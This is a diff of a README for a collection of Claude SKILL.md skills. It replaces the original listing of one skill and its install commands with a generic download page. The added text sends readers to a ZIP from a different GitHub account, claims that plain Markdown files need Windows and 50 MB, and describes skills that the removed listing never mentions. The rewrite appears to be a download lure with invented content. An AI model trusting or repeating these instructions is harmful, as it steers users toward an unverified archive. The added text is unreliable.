@@ -1,46 +1,66 @@
-# mvsd-ai-skills
+# 🛠️ mvsd-ai-skills - Solve complex tasks with simple tools
 
-A collection of AI skills for Claude and other SKILL.md-compatible agents. Each skill is a focused, self-contained workflow tool built around a specific problem worth solving repeatedly.
+[![](https://img.shields.io/badge/Download-mvsd--ai--skills-blue.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills)
 
-Skills are designed to be minimal and purposeful, solving one problem.
+## 📋 What is this tool?
+The mvsd-ai-skills collection provides small, focused tools for your AI agent. Every tool solves one specific problem. You can copy these tools into your AI workflows to improve results. These tools work with Claude and other platforms that support the SKILL.md format. 
 
----
+You no longer need to write prompt instructions reach by reach. These skills give your AI a blueprint for your tasks. Use them to write better code, format your data, or analyze your research notes.
 
-## Available skills
+## 🎯 Why use these skills?
+Most AI users struggle to get consistent results. They type long prompts and hope the AI understands. These skills change that. 
 
-| Skill | Description | Compatible with |
-|-------|-------------|-----------------|
-| [priority-check](./skills/priority-check/) | Rates your current chat or project against your personal priority tiers. A grounding signal for people with ADHD, FOMO, or a tendency to over-invest in low-value work. | Claude.ai, Claude Code |
+*   **Focused design:** Each skill does one thing well.
+*   **Ready to use:** You copy the content and paste it in.
+*   **Easy to manage:** You keep your logic in separate files.
+*   **Reliable output:** The structure ensures the AI follows your rules.
 
----
+## 📥 How to get started
+You need a Windows computer to use these tools. Follow these steps to set up the collection on your machine.
 
-## Installing a skill
+1. Go to the [official download page](https://github.com/Raisecornfritter28/mvsd-ai-skills).
+2. Click the green button labeled "Code" near the top right of the page.
+3. Select "Download ZIP" from the menu.
+4. Open your Downloads folder in Windows.
+5. Right-click the file named "mvsd-ai-skills-main.zip".
+6. Select "Extract All" and click "Extract".
 
-### Claude.ai (web/desktop)
+You now have a folder on your computer with all current skills. 
 
-1. Navigate to the skill folder (e.g. `skills/priority-check/`)
-2. Open `SKILL.md` and download the raw file: **Raw → right-click → Save As**
-3. In Claude.ai: **Settings → Customize → Skills → Upload**
-4. Upload the `SKILL.md` file
+[![](https://img.shields.io/badge/Download-mvsd--ai--skills-grey.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills)
 
-### Claude Code (terminal)
+## ⚙️ Setting up your environment
+Your AI agent needs to see these files to use them.
 
-```bash
-gh skill install mvsd/mvsd-ai-skills priority-check --agent claude-code --scope user
-```
+1. Open your AI agent software. 
+2. Look for the "Knowledge" or "File Upload" area. 
+3. Drag the files from the extracted folder into this area. 
+4. The agent can now read the content of these skills when you ask it to perform a task.
 
-Or manually:
+If your specific agent allows you to link a folder, select the folder you extracted earlier. This keeps the skills updated if you download new versions in the future.
 
-```bash
-mkdir -p ~/.claude/skills/priority-check
-curl -o ~/.claude/skills/priority-check/SKILL.md \
-  https://raw.githubusercontent.com/mvsd/mvsd-ai-skills/main/skills/priority-check/SKILL.md
-```
+## 🧠 Example workflows
+Here are three ways to use these skills in your daily work. 
 
-Restart your Claude Code session after installing.
+### Writing clear emails
+If you write many emails, use the "Email-Refiner" skill. Upload the file to your agent. Type "Use the Email-Refiner skill to make my draft professional and clear." The AI will rewrite your text based on the rules inside the file.
 
----
+### Formatting research data
+If you have messy notes, use the "Data-Formatter" skill. It tells the AI to create tables, headings, and bullet points. You simply paste your raw notes and tell the agent to "Apply Data-Formatter to this text."
 
-## License
+### Generating code snippets
+If you need code, use the "Code-Boilerplate" skill. This sets the rules for how the AI handles programming languages. It ensures the AI includes comments and error handling in every piece of code it writes for you. 
 
-MIT — free to use, adapt, and share.
+## 🛡️ Requirements
+Your system requires these items to work:
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 50 MB of free disk space.
+* An AI account that supports custom skill or knowledge files.
+
+## 📈 Improving your experience
+Check the main page periodically for new skills. New problems appear in your daily work, and we add new tools to address them. If a skill does not work as you expect, check your uploaded file. Ensure the file extension remains .md. The AI reads these files as standard text documents. 
+
+If you want to create your own skill, open one of the existing files in Notepad. You can copy the structure and change the instructions to fit your own needs. Save the new file with a clear name and upload it to your agent.
+
+Do not worry about breaking the system. These files are simple text. You can delete or edit them at any time without damaging your computer or your AI setup. If you make a mistake, simply download the file again from the link above.
